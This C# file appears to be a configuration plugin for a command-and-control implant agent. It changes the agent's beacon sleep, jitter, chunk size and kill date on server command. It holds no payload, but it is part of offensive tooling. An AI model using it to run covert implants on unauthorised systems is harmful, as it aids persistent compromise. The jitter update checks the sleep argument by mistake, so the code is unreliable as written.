﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "config";
        private IAgentConfig config { get; set; }
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            try
            {
                ConfigUpdateArgs args = JsonSerializer.Deserialize<ConfigUpdateArgs>(job.task.parameters);

                if (args is null)
                {
                    await messageManager.Write("Invalid parameters", job.task.id, true, "error");
                    return;
                }
                StringBuilder sb = new StringBuilder();

                if(args.sleep >= 0)
                {
                    config.sleep = args.sleep;
                    sb.AppendLine($"Updated sleep interval to {config.sleep}");
                }

                if(args.sleep >= 0)
                {
                    config.jitter = args.jitter;
                    sb.AppendLine($"Updated jitter interval to {config.jitter}");
                }

                if(args.chunk_size >= 0)
                {
                    config.chunk_size = args.chunk_size;
                    sb.AppendLine($"Updated chunk size to {config.chunk_size}");
                }

                if(!String.IsNullOrEmpty(args.killdate))
                {
                    DateTime killDate;
                    if(DateTime.TryParse(args.killdate, out killDate))
                    {
                        if(killDate != DateTime.MinValue)
                        {
                            config.killDate = killDate;
                            sb.AppendLine($"Updated killdate to {config.killDate}");

                        }
                    }
                    else
                    {
                        sb.AppendLine($"Invalid date format {args.killdate}");

                    }
                }

                await messageManager.Write(sb.ToString(), job.task.id, true, "");

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());    
                await messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
